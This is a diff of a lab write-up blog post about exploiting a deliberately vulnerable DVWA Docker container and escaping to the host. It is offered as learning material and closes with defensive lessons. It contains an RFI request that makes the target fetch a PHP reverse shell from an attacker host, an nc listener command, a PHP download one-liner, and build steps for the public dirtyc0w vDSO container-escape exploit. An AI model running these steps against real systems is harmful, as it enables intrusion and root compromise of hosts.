@@ -64,16 +64,17 @@ It's conveniently marked with "CHANGE THIS" so you know what to update. If you w
 
 ### Getting your foot in the door
 
-First we'll go to the File Inclusion page. At this point, my attacking machine has apache running, I've copied and fixed my reverse shell, hosted it in my /var/www/html folder, I've started a nc listener with nc -nlvp 443 and I've browsed to the RFI page. The RFI is easy peasy here, this request in your browser will trigger it:
+First we'll go to the File Inclusion page. At this point, my attacking machine has apache running, I've copied and fixed my reverse shell, hosted it in my /var/www/html folder, renamed it something short and easy to call, I've started a nc listener with nc -nlvp 443 and I've browsed to the RFI page (whew). The RFI is easy peasy here, this request in your browser will trigger it:
 
 ~~~
-http://192.168.1.17/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
+http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
 ~~~
 
 It's important to use the .txt extension since using .php will cause your browser to interpret the script and you'll reverse shell yourself, which isn't as exciting. In this particular page, you can View Source to see the site isn't doing anything to append anything to your requested page, so you don't need to use null characters to terminate the request. 
 
-Now we've got a reverse shell. Now what? It's time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we're running a version that's vulnerable to
-dirtyc0w. Since the container is simply an "isolated" sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we're right:
+### Poking Around and Enumeration
+
+Now we've got a reverse shell. Now what? It's time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we're running a version that's vulnerable to dirtyc0w. Since the container is simply an "isolated" sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we're right (some IPs might not match in screenshots because I've messed with VMs quite a bit for other stuff since I started this post, but the idea is the same):
 
 ![Kernels]({{site.url}}/images/kernels.png){: .center-image }
 
@@ -81,24 +82,31 @@ For giggles, let's run a Centos container and see what it's running under the ho
 
 ![Centosbuntu]({{site.url}}/images/Centosbuntu.png){: .center-image } 
 
-That's interesting! There's no difference between the kernel in the container and the one in the VM. It'd be interesting to see how important that is, but that's kind of outside the scope of what I'm doing. Let's keep poking around. 
+That's interesting! There's no difference between the kernel in the container and the one in the VM. It'd be interesting to see how important that is for packages that expect to be run in CentOS, but that's kind of outside the scope of what I'm doing. Let's keep moving forward. 
 
-If we have a vulnerable kernel, we need to get our exploit to the box. How do we do that? We could echo it line by line into a file, but that's so painful over a reverse shell. If we check for applications on the server, we are missing things like wget, curl, and fetch. We do have python, perl, so that's nice. If we go a little further and check the /usr/bin directory, we find sftp. That's handy, but where did it come from?
+### Picking an Exploit 
 
-Remember the Dockerfile [from here](https://github.com/remotephone/dvwa-lamp/blob/master/Dockerfile)? If you look at the files installed, sftp was installed as part of openssh-client. From the container:
+We need to pick an exploit that works and gets us to the host. The fact that we're in a container means userspace exploits are useless. Even if you escalate to root inside the container, you still don't own the host. You need to exploit a kernel vulnerability in a way that let's you get out of the confines of the container. 
 
-~~~
-$ dpkg -S /usr/bin/sftp
-openssh-client: /usr/bin/sftp
-~~~
+Lot's of the (dirtyc0w POC's)[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs] I've seen give you rights to modify files as root and other things, which, even if they do affect the underlying OS, don't give you a way to take advantage of that from your session. Scumjr published an exploit that somewhat reliably allows you to escape the container (here)[https://github.com/scumjr/dirtycow-vdso]. It's glorious. You'll need gcc, make, and nasm installed to compile this. 
 
-If you run a default Ubuntu container though, openssh-client isn't included, it was installed as part of git.  Check for yourself in a default Ubuntu container, lots of the stuff we'd typically rely on getting files into and out of a server we're in aren't there. No ftp, no tftp, no wget, curl, fetch, etc etc. This complicates getting our exploit code on to the server. Further, it complicates compiling it once it's there.  
+(This article)[https://www.aporeto.com/dirty-cow-story-privilege-escalation-vulnerability/] breaks down really well how the exploit we're going to use breaks out of the confines of the container. In short, it manipulates memory space shared between the container and host and tricks processes checking the systemtime in that memory space to trigger the exploit, sending you a shell from the host (pretty sure that's right, tell me if I'm not).
+
+If we have a vulnerable kernel, we need to get our exploit to the box. How do we do that? We could echo it line by line into a file, but that's so painful over a reverse shell. If we check for applications on the server, we are missing things like wget, curl, and fetch. We do have python, perl, so that's nice. If we go a little further and check the /usr/bin directory, we find sftp. That's handy, but it came from an installation of git and openssh-client, which we really can't depend on.
+
+### Living off the land when you're in a desert
+ 
+Check for yourself in a default Ubuntu container, lots of the stuff we'd typically rely on getting files into and out of a server we're in aren't there. No ftp, no tftp, no wget, curl, fetch, etc etc. This complicates getting our exploit code on to the server.  
 
 In the spirit of living off the land, let's start with what got us here to begin with, php. We have rights to the system, we can move around in a shell, let's see if we can excute php. This isn't pretty, but it proves my point, we can execute arbitrary php commands.
 
 ![PHP Works]({{site.url}}/images/phpworks.png){: .center-image } 
  
-Let's find somewhere we can write to, then we'll use our php file inclusion vulnerability to bring a file in of our choosing. We need somewhere we can write to, and /tmp is often available. The same is the case here:
+So great, we can move stuff in and out, but can we compile anything once it's there? I checked a handful of popular containers like the CentOS one, redis, and jenkins and they all come pretty bare. These are some results from redis and jenkins:
+
+![Installed default packages]({{site.url}}/images/whichredisjenkins.png){: .center-image }
+
+I don't really know a lot of ways to deal with this gracefully. If you don't have anything on the system and you can't or don't want to install additional packages, the only option I know is compiling it elsewhere and bringing it to the server. Let's find somewhere we can write to, then we'll use php to bring in our exploit. We need somewhere we can write to, and /tmp is often available. The same is the case here:
 
 ~~~
 $ ls -asl /tmp
@@ -107,18 +115,34 @@ total 8
 4 drwxr-xr-x 54 root root 4096 Jan 12 03:21 ..
 ~~~
 
-To download a file with php, we can use this simple oneliner. 
+### Compiling your exploit. 
+
+We already know the kernel version, 4.4.0-31 and we don't have an image laying around with that particular version, but we do have an updated image in an VM we have sitting around. To install the appropriate kernel, we need to find it. Search <distroname> <kernel verison> in google and you'll hopefully find something like [this page](http://packages.ubuntu.com/xenial/amd64/linux-image-4.4.0-31-generic/download) where you can download and install the kernel with:
 
 ~~~
-php -r 'file_put_contents("test", file_get_contents("http://192.168.1.20/test"));'
+dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
+~~~
+ 
+You might also need the image-extra or headers package. Reboot into your new kernel, make sure you have the apporpriate packages installed, then compile it. If you don't, have everything installed, this is the full process:
+
+~~~
+sudo apt-get install git nasm make gcc
+git clone https://github.com/scumjr/dirtycow-vdso.git
+cd dirtycow-vdso
+make
 ~~~
 
-I created a file called test on my web server and echo'ed hello into it so it had something we can see work, and voila! It transfers.
-
-![PHP Download]({{site.url}}/images/phpdownloads.png){: .center-image }
-
-So now that we can move files to and from our server, we need to figure out how to get our exploit there. We don't have gcc available, which makes this difficult. 
+Now move the file off your test system, on to your attacking host and into your /var/www/html folder. From here, you should be able to get into /tmp, pull the file into your victim host, change permissions, run the exploit, and get your shell. Since you're sending a shell back to your container from the host, you need to make sure you send it to the proper IP. By default, the exploit uses 127.0.0.1, which will not work. You only get one chance with this exploit if it goes wrong, so make sure you send it to the docker eth0 and you'll get your shell back as root inside the host!
 
 
-**The plan originally was to use a dirtyc0w exploit on the container and get an escape. I want a scenario that's not completely artificial but at the same time reproducible, so I need to plan this some more. The short of it all is, you can use kernel exploits to escape container space and compromise the host. More on this later. I started some courses from udemy and they're taking up enough of my time where I don't want to stop adding content to give myself enough time to figure out how to write this scenario properly AND still get something done with my studies. I'll be updating this soon**
-----to be continued....---
+![Full Escape]({{site.url}}/images/fullescape.png){: .center-image }
+
+
+And there you go, you've successfully gone from a web application, to a container shell, to a full host escape and root! Sobering stuff.
+
+
+### Lessons Learned
+
+Containers are not a panacea. They won't mean you're 100% secure, but they do put some difficult restrictions around attackers. Unless they haven't gotten around to patching dirtyc0w (which wouldn't be *that* surprising), you better be sitting on some creative ways of interacting with the kernel if you want to escape a container. As people get better with containers, best practices get better defined, and things like (Clear Linux)[https://clearlinux.org/] really take off, I think it's only going to get more interesting for attackers and pen testers.
+
+Thanks!
